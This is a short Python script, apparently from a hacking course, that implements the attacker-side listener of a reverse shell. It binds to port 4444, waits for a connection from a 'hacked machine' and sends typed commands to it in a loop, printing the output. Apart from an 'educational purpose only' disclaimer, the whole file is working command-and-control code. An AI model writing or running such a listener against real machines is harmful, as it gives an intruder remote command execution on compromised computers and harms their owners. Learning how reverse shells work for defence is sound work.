#!/user/bin/env python
"""
Author：Seldon Pang

Listener for incoming connection from the hacked machine
Please use for educational purpose only...
"""

import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection.")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def execute_remote_command(self, command):
        self.connection.send(command)
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remote_command(command)
            print(result)


# Replace ip with the ip of the hacked machine
my_listener = Listener("192.168.1.23", 4444)
my_listener.run()